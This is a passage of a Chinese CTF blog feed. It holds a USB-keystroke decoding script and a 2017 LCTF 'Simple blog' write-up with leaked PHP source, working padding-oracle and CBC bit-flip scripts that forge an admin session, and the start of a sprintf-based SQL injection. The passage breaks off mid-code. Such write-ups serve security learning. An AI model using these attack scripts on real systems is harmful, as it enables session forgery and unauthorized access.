<p>导出键盘数据，脚本解密得到flag，要注意的是需要判断shift状态来区分大小写<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</div><div class="line">nums = []</div><div class="line">keys = open(<span class="string">'usbdata.txt'</span>)</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</div><div class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> :</div><div class="line">         <span class="keyword">continue</span></div><div class="line">    <span class="keyword">print</span> mappings[int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)],line</div><div class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</div><div class="line">    <span class="comment">#print nums</span></div><div class="line">keys.close()</div><div class="line">output = <span class="string">""</span></div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</div><div class="line">    i+=<span class="number">1</span></div><div class="line">    </div><div class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">print</span> i,output,mappings[n]</div><div class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</div><div class="line">        output += mappings[n]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        output += <span class="string">'[unknown]'</span></div><div class="line">    </div><div class="line"><span class="keyword">print</span> <span class="string">'output :n'</span> + output</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit13.png" alt=""><br>02开头的为按住shift状态</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚放假正好看到HITCTF，划了几道水题，WriteUp如下&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2017 LCTF WriteUp</title>
    <link href="https://www.codemonster.cn/2017/11/19/2017-lctf-writeup/"/>
    <id>https://www.codemonster.cn/2017/11/19/2017-lctf-writeup/</id>
    <published>2017-11-19T15:55:00.000Z</published>
    <updated>2018-07-28T06:19:31.487Z</updated>
    
    <content type="html"><![CDATA[<p>周末刚刚结束的LCTF，我们队一共做出了4道web，一道misc还有一道问卷调查（好气啊没抢到一血换pwnhub邀请码），感谢<code>吃饭去</code>大佬带飞~<br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对本渣渣而言，本次比赛质量还是不错的，我们队做出的四道web就涉及到了<code>CBC字节翻转攻击</code>、<code>PaddingOracle攻击</code>、<code>sprintf格式化注入</code>、<code>sql报错注出库名表名</code>、<code>join注入出列名</code>、<code>orderby无表名注入数据</code>、<code>SSRF绕过</code>、<code>条件竞争</code>、<code>7个字符内getshell</code>等知识，收获颇丰<br>下面是4道web的WriteUp</p>
<h1 id="Simple-blog"><a href="#Simple-blog" class="headerlink" title="Simple blog"></a>Simple blog</h1><p>A simple blog .To discover the secret of it.<br><a href="http://111.231.111.54/" target="_blank" rel="noopener">http://111.231.111.54/</a></p>
<h2 id="0x00获取源码"><a href="#0x00获取源码" class="headerlink" title="0x00获取源码"></a>0x00获取源码</h2><p>扫一下发现存在<code>.login.php.swp</code>和<code>.admin.php.swp</code>泄露<br><code>vim -r login.php</code>恢复后可以查看源码<br>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="string">&lt;html&gt;</span></div><div class="line"><span class="string">&lt;head&gt;</span></div><div class="line"><span class="string">  &lt;meta charset="UTF-8"&gt;</span></div><div class="line"><span class="string">  &lt;title&gt;Login Form&lt;/title&gt;</span></div><div class="line"><span class="string">  &lt;link rel="stylesheet" type="text/css" href="css/login.css" /&gt;</span></div><div class="line"><span class="string">&lt;/head&gt;</span></div><div class="line"><span class="string">&lt;body&gt;</span></div><div class="line"><span class="string">  &lt;div class="login"&gt;</span></div><div class="line"><span class="string">    &lt;h1&gt;后台登录&lt;/h1&gt;</span></div><div class="line"><span class="string">    &lt;form method="post"&gt;</span></div><div class="line"><span class="string">        &lt;input type="text" name="username" placeholder="Username" required="required" /&gt;</span></div><div class="line"><span class="string">        &lt;input type="password" name="password" placeholder="Password" required="required" /&gt;</span></div><div class="line"><span class="string">        &lt;button type="submit" class="btn btn-primary btn-block btn-large"&gt;Login&lt;/button&gt;</span></div><div class="line"><span class="string">    &lt;/form&gt;</span></div><div class="line"><span class="string">&lt;/div&gt;</span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;</span></div><div class="line"><span class="string">'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</div><div class="line">    $random_token = <span class="string">''</span>;</div><div class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">global</span> $id;</div><div class="line">    $token = get_random_token();</div><div class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</div><div class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</div><div class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</div><div class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</div><div class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</div><div class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">	$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</div><div class="line">	$password = $_POST[<span class="string">'password'</span>];</div><div class="line">	$result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</div><div class="line">  		get_identity();</div><div class="line">  		header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">  	&#125;<span class="keyword">else</span>&#123;</div><div class="line">  		<span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</div><div class="line">  	&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">if</span>(test_identity())&#123;</div><div class="line">        header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">        show_page();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>admin.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</div><div class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		$title = <span class="string">''</span>;</div><div class="line">	&#125;</div><div class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">	$result = mysql_query($sql,$con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</div><div class="line">		<span class="keyword">die</span>();</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">	&lt;title&gt;adminpage&lt;/title&gt;</div><div class="line">	&lt;link href=<span class="string">"css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</div><div class="line">    &lt;script src=<span class="string">"js/jquery.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">    &lt;script src=<span class="string">"js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">	&lt;nav class="navbar navbar-default" role="navigation"&gt;</div><div class="line">   &lt;div class="navbar-header"&gt;</div><div class="line">      &lt;a class="navbar-brand" href="#"&gt;后台&lt;/a&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">   &lt;div&gt;</div><div class="line">      &lt;ul class="nav navbar-nav"&gt;</div><div class="line">         &lt;li class="active"&gt;&lt;a href="#"&gt;编辑文章&lt;/a&gt;&lt;/li&gt;</div><div class="line">         &lt;li&gt;&lt;a href=<span class="string">"#"</span>&gt;设置&lt;/a&gt;&lt;/li&gt;</div><div class="line">      &lt;/ul&gt;</div><div class="line">   &lt;/div&gt;&lt;/nav&gt;</div><div class="line">   &lt;div class="panel panel-success"&gt;</div><div class="line">   &lt;div class="panel-heading"&gt;</div><div class="line">      &lt;h1 class="panel-title"&gt;文章列表&lt;/h1&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">   &lt;div class="panel-body"&gt;</div><div class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=1'</span>&gt;Welcome to myblog&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</div><div class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=2'</span>&gt;Hello,world!&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</div><div class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=3'</span>&gt;This is admin page&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>可以看到这道题分为两个部分，第一部分管理员登录，第二部分大概率是个注入</p>
<h2 id="0x01管理员登录"><a href="#0x01管理员登录" class="headerlink" title="0x01管理员登录"></a>0x01管理员登录</h2><p>测试发现<code>admin=123&amp;password[]=111</code>或者直接<code>弱口令admin、admin</code>可以直接登录并跳转到<code>admin.php</code>，但是却提示不是真正的admin，查看admin.php源码，发现只有<code>$_SESSION[&#39;isadmin&#39;]</code>存在时，才算真正的管理员<br>而login.php中有关session的操作，就涉及到<code>get_identity()</code>和<code>test_identity()</code>两个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">global</span> $id;</div><div class="line">    $token = get_random_token();</div><div class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</div><div class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</div><div class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</div><div class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</div><div class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</div><div class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这两个函数和2017NJCTF的一道cbc字节翻转题几乎一模一样，这里我参考了<a href="http://www.jianshu.com/p/7f171477a603" target="_blank" rel="noopener">Pr0ph3t</a>大佬的文章，通过构造特定的token(IV)进行<code>CBC字节翻转攻击</code>，使得服务器解出来的明文为<code>admin</code>，<br>但是这里不知道 <code>id</code>的值<br>再参考<a href="http://www.freebuf.com/vuls/98156.html" target="_blank" rel="noopener">FreeBuff</a>的这篇文章，通过构造特定的token，也就是IV，利用<code>test_identity()</code>函数导致的页面返回不同进行<code>PaddingOracle攻击</code>，从而推导出中间值，然后求出明文，也就是<code>id</code><br>总结一下，第一部分我们要做的有以下这几步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.弱口令登录</div><div class="line">2.PaddingOracle攻击得到id</div><div class="line">3.CBC字节翻转攻击伪造成真正的admin</div></pre></td></tr></table></figure></p>
<p>PaddingOracle攻击脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r1</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">flag=<span class="string">''</span></div><div class="line">url=<span class="string">"http://111.231.111.54/login.php"</span></div><div class="line">token=base64.b64decode(<span class="string">"N2ZtWmZjSWJmaUtRNFNSeg=="</span>)</div><div class="line">id=<span class="string">''</span></div><div class="line">idhex=<span class="string">''</span></div><div class="line">n=<span class="number">15</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>*<span class="number">16</span>):</div><div class="line">        ok=<span class="string">''</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> flag:</div><div class="line">            ok+=chr((j+<span class="number">1</span>)^ord(k))</div><div class="line">        ss=(<span class="number">15</span>-j)*<span class="string">'\x00'</span>+chr(i)+ok</div><div class="line">        s=base64.b64encode(ss)</div><div class="line">        header=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=0t4h76nv16i4m61noh2gli2nd5; token="</span>+s+<span class="string">";"</span>&#125;</div><div class="line">        r2=r1.get(url,headers=header)</div><div class="line">        <span class="comment">#print r2.text</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"Error"</span> <span class="keyword">not</span> <span class="keyword">in</span> r2.text:</div><div class="line">            <span class="comment">#print (i^(j+1)),i,j</span></div><div class="line">            flag=chr(i^(j+<span class="number">1</span>))+flag</div><div class="line">            id=chr((i^(j+<span class="number">1</span>))^(ord(token[<span class="number">15</span>-j])))+id</div><div class="line">            idhex=hex((i^(j+<span class="number">1</span>))^(ord(token[<span class="number">15</span>-j])))+<span class="string">"-"</span>+idhex</div><div class="line">            <span class="keyword">print</span> j,id</div><div class="line">            <span class="keyword">print</span> j,idhex</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>其中token和cookie要修改成第一步登录成功后的token和cookie，最后能求出14位id和一位0x01，可以爆破最后一位</p>
<p>CBC字节翻转攻击脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line">dic = open(<span class="string">"passsss.txt"</span>,<span class="string">"a"</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">    source_str = chr(i)+<span class="string">'EZKIhn1dPhWY2P'</span>+<span class="string">'\x01'</span></div><div class="line">    target_srt = <span class="string">'admin'</span> + <span class="number">11</span> * <span class="string">'\x0b'</span></div><div class="line">    token = <span class="string">'cWMzdTJQMUxGSmJSRmt5Vw=='</span> <span class="comment">#你获得的初始IV的base64encode值</span></div><div class="line">    token = list(b64.b64decode(token))</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,len(target_srt)):</div><div class="line">        token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))</div><div class="line">    sss=b64.b64encode(<span class="string">''</span>.join(token))</div><div class="line">    dic.write(<span class="string">""</span>.join(sss))</div><div class="line">    dic.write(<span class="string">""</span>.join(<span class="string">"\n"</span>))</div><div class="line">dic.close()</div></pre></td></tr></table></figure></p>
<p>然后去burpsuite里爆破token就好，即可登录为管理员</p>
<h2 id="0x02sql注入"><a href="#0x02sql注入" class="headerlink" title="0x02sql注入"></a>0x02sql注入</h2><p>这部分的核心代码主要是这几句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> $id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">	$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">	$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	$title = <span class="string">''</span>;</div><div class="line">&#125;</div><div class="line">$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">$result = mysql_query($sql,$con);</div><div class="line">$row = mysql_fetch_array($result);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span 